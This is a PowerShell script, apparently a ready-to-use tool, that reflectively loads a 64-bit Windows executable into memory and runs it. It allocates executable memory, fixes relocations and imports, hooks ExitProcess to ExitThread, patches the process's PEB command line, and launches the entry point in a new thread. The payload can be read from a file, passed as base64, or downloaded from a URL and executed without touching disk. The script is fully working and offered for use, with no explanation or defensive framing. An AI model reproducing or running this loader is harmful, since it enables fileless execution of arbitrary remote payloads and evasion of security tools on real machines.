param(
    [string]$Path,
    [string]$Base64,
    [string]$Url,
    [string]$Arguments,
    [string]$ExeName = "app.exe"
)

$MemberDef = '[DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr VirtualAlloc(IntPtr addr, UIntPtr size, uint type, uint prot);
[DllImport("kernel32.dll", SetLastError=true)] public static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint newProt, out uint oldProt);
[DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Ansi)] public static extern IntPtr LoadLibraryA(string name);
[DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr hModule, string name);
[DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr GetProcAddressOrd(IntPtr hModule, IntPtr ordinal);
[DllImport("kernel32.dll")] public static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr addr, UIntPtr size);
[DllImport("kernel32.dll")] public static extern IntPtr GetCurrentProcess();
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr attr, UIntPtr stackSize, IntPtr entry, IntPtr param, uint flags, out uint tid);
[DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr handle, uint ms);
[DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr handle);
[DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr hProcess, int cls, byte[] pbi, int sz, out int ret);'

try { Add-Type -MemberDefinition $MemberDef -Name 'W32' -Namespace 'PEL' -ErrorAction Stop } catch {}

function ru16($d,$o){[BitConverter]::ToUInt16($d,$o)}
function ru32($d,$o){[BitConverter]::ToUInt32($d,$o)}
function ru64($d,$o){[BitConverter]::ToUInt64($d,$o)}
function wm64($a,[UInt64]$v){[System.Runtime.InteropServices.Marshal]::Copy([BitConverter]::GetBytes($v),0,$a,8)}
function rm64($a){$b=New-Object byte[] 8;[System.Runtime.InteropServices.Marshal]::Copy($a,$b,0,8);[BitConverter]::ToUInt64($b,0)}
function rm16($a){$b=New-Object byte[] 2;[System.Runtime.InteropServices.Marshal]::Copy($a,$b,0,2);[BitConverter]::ToUInt16($b,0)}

$PM=@{"000"=0x01;"010"=0x02;"001"=0x04;"011"=0x04;"100"=0x10;"110"=0x20;"101"=0x40;"111"=0x40}

function Do-Reloc($base,[UInt64]$rRva,[UInt32]$rSz,[Int64]$delta){
    $p=0
    while($p -lt $rSz){
        $ba=[IntPtr]::Add($base,$rRva+$p)
        $bb=New-Object byte[] 8;[System.Runtime.InteropServices.Marshal]::Copy($ba,$bb,0,8)
        $pr=[BitConverter]::ToUInt32($bb,0);$bs=[BitConverter]::ToUInt32($bb,4)
        if($bs -lt 8){break}
        $n=[int](($bs-8)/2)
        $ea=[IntPtr]::Add($base,$rRva+$p+8)
        $en=New-Object byte[] ($n*2);[System.Runtime.InteropServices.Marshal]::Copy($ea,$en,0,$en.Length)
        for($i=0;$i -lt $n;$i++){
            $e=[BitConverter]::ToUInt16($en,$i*2)
            $t=$e -shr 12;$off=$e -band 0xFFF
            if($t -eq 10){
                $addr=[IntPtr]::Add($base,$pr+$off)
                $val=rm64 $addr
                wm64 $addr ([UInt64]($val+$delta))
            }
        }
        $p+=$bs
    }
}

function Do-Imports($base,[UInt64]$iRva){
    $k32h=[PEL.W32]::LoadLibraryA("kernel32.dll")
    $pExitThread=[PEL.W32]::GetProcAddress($k32h,"ExitThread")
    $p=0
    while($true){
        $da=[IntPtr]::Add($base,$iRva+$p)
        $dc=New-Object byte[] 20;[System.Runtime.InteropServices.Marshal]::Copy($da,$dc,0,20)
        $ilt=ru32 $dc 0;$nr=ru32 $dc 12;$iat=ru32 $dc 16
        if($nr -eq 0){break}
        $dll=[System.Runtime.InteropServices.Marshal]::PtrToStringAnsi([IntPtr]::Add($base,$nr))
        $hm=[PEL.W32]::LoadLibraryA($dll)
        if($hm -eq [IntPtr]::Zero){throw "LoadLibrary($dll) failed"}
        $isK32=$dll -match '(?i)^kernel32(\.dll)?$'
        $lk=if($ilt -ne 0){$ilt}else{$iat}
        $o=0
        while($true){
            $ta=[IntPtr]::Add($base,$lk+$o)
            $th=rm64 $ta
            if($th -eq 0){break}
            $proc=[IntPtr]::Zero
            if($th -band ([UInt64]1 -shl 63)){
                $ord=[int]($th -band 0xFFFF)
                $proc=[PEL.W32]::GetProcAddressOrd($hm,[IntPtr]$ord)
            }else{
                $ha=[IntPtr]::Add($base,[int]($th -band 0x7FFFFFFF)+2)
                $fn=[System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ha)
                if($isK32 -and $fn -eq "ExitProcess" -and $pExitThread -ne [IntPtr]::Zero){
                    $proc=$pExitThread
                    Write-Host "[+] IAT hook: ExitProcess -> ExitThread"
                }else{
                    $proc=[PEL.W32]::GetProcAddress($hm,$fn)
                }
            }
            if($proc -eq [IntPtr]::Zero){throw "GetProcAddress failed in $dll"}
            $ie=[IntPtr]::Add($base,$iat+$o)
            wm64 $ie ([UInt64]$proc.ToInt64())
            $o+=8
        }
        $p+=20
    }
}

function Do-PebPatch([string]$cmd){
    $pbi=New-Object byte[] 48;$ret=0
    [PEL.W32]::NtQueryInformationProcess([PEL.W32]::GetCurrentProcess(),0,$pbi,48,[ref]$ret)|Out-Null
    $peb=[IntPtr][BitConverter]::ToInt64($pbi,8)
    $pp=rm64 ([IntPtr]::Add($peb,0x20))
    $pa=[IntPtr]$pp
    $cb=[System.Text.Encoding]::Unicode.GetBytes($cmd+[char]0)
    $nl=$cb.Length-2
    $em=rm16 ([IntPtr]::Add($pa,0x72))
    $eb=rm64 ([IntPtr]::Add($pa,0x78))
    if($cb.Length -le $em -and $eb -ne 0){
        [System.Runtime.InteropServices.Marshal]::Copy($cb,0,[IntPtr]$eb,$cb.Length)
        if($cb.Length -lt $em){
            $z=New-Object byte[] ($em-$cb.Length)
            [System.Runtime.InteropServices.Marshal]::Copy($z,0,[IntPtr]($eb+$cb.Length),$z.Length)
        }
        [System.Runtime.InteropServices.Marshal]::Copy([BitConverter]::GetBytes([UInt16]$nl),0,[IntPtr]::Add($pa,0x70),2)
    }else{
        $buf=[PEL.W32]::VirtualAlloc([IntPtr]::Zero,[UIntPtr]::new($cb.Length),0x3000,0x04)
        [System.Runtime.InteropServices.Marshal]::Copy($cb,0,$buf,$cb.Length)
        [System.Runtime.InteropServices.Marshal]::Copy([BitConverter]::GetBytes([UInt16]$nl),0,[IntPtr]::Add($pa,0x70),2)
        [System.Runtime.InteropServices.Marshal]::Copy([BitConverter]::GetBytes([UInt16]($nl+2)),0,[IntPtr]::Add($pa,0x72),2)
        wm64 ([IntPtr]::Add($pa,0x78)) ([UInt64]$buf.ToInt64())
    }
}

function Invoke-PELoader{
    param([byte[]]$PEData,[string]$CmdLine)
    if($PEData[0] -ne 0x4D -or $PEData[1] -ne 0x5A){throw "Not a PE (no MZ)"}
    $elf=ru32 $PEData 0x3C;$co=$elf+4
    $ns=ru16 $PEData ($co+2);$os=ru16 $PEData ($co+16);$op=$co+20
    if((ru16 $PEData $op) -ne 0x20B){throw "PE32+ only"}
    $ep=ru32 $PEData ($op+16);$ib=ru64 $PEData ($op+24)
    $si=ru32 $PEData ($op+56);$sh=ru32 $PEData ($op+60)
    $nd=ru32 $PEData ($op+108);$do=$op+112
    $dd=@();for($i=0;$i -lt [Math]::Min($nd,16);$i++){$dd+=,@((ru32 $PEData ($do+$i*8)),(ru32 $PEData ($do+$i*8+4)))}
    $so=$op+$os;$secs=@()
    for($i=0;$i -lt $ns;$i++){
        $o=$so+$i*40
        $secs+=,@((ru32 $PEData ($o+8)),(ru32 $PEData ($o+12)),(ru32 $PEData ($o+16)),(ru32 $PEData ($o+20)),(ru32 $PEData ($o+36)))
    }
    $base=[PEL.W32]::VirtualAlloc([IntPtr]::Zero,[UIntPtr]::new($si),0x3000,0x40)
    if($base -eq [IntPtr]::Zero){throw "VirtualAlloc failed"}
    [System.Runtime.InteropServices.Marshal]::Copy($PEData,0,$base,[int]$sh)
    foreach($s in $secs){if($s[2] -gt 0){[System.Runtime.InteropServices.Marshal]::Copy($PEData,[int]$s[3],[IntPtr]::Add($base,$s[1]),[int]$s[2])}}
    $delta=[Int64]($base.ToInt64()-[Int64]$ib)
    if($delta -ne 0 -and $dd.Count -gt 5 -and $dd[5][0] -ne 0){Do-Reloc $base $dd[5][0] $dd[5][1] $delta}
    if($dd.Count -gt 1 -and $dd[1][0] -ne 0){Do-Imports $base $dd[1][0]}
    [PEL.W32]::FlushInstructionCache([PEL.W32]::GetCurrentProcess(),$base,[UIntPtr]::new($si))|Out-Null
    foreach($s in $secs){
        $x=[int](($s[4] -band 0x20000000) -ne 0);$r=[int](($s[4] -band 0x40000000) -ne 0);$w=[int](($s[4] -band 0x80000000) -ne 0)
        $k="$x$r$w";$pr=if($PM.ContainsKey($k)){$PM[$k]}else{0x04};$old=[uint32]0
        [PEL.W32]::VirtualProtect([IntPtr]::Add($base,$s[1]),[UIntPtr]::new([Math]::Max($s[0],1)),$pr,[ref]$old)|Out-Null
    }
    if($CmdLine){Do-PebPatch $CmdLine;Write-Host "[+] CmdLine: $CmdLine"}
    $entry=[IntPtr]::Add($base,$ep)
    Write-Host "[+] Mapped 0x$($base.ToString('X')) entry 0x$($entry.ToString('X'))"
    $tid=[uint32]0
    $ht=[PEL.W32]::CreateThread([IntPtr]::Zero,[UIntPtr]::new(0x800000),$entry,[IntPtr]::Zero,0,[ref]$tid)
    if($ht -eq [IntPtr]::Zero){throw "CreateThread failed"}
    Write-Host "[+] Thread $tid running"
    [PEL.W32]::WaitForSingleObject($ht,0xFFFFFFFF)|Out-Null
    [PEL.W32]::CloseHandle($ht)|Out-Null
}

# --- Main ---
if($Base64){
    $peData=[Convert]::FromBase64String($Base64)
}elseif($Url){
    $peData=[Convert]::FromBase64String((New-Object Net.WebClient).DownloadString($Url).Trim())
}elseif($Path){
    $peData=[IO.File]::ReadAllBytes((Resolve-Path $Path).Path)
}else{
    Write-Host "Usage: peloader.ps1 -Path <file> | -Base64 <b64> | -Url <url> [-Arguments <args>]"
    return
}
Write-Host "[+] PE: $($peData.Length) bytes"
$cl=$null;if($Arguments){$cl="$ExeName $Arguments"}
Invoke-PELoader -PEData $peData -CmdLine $cl
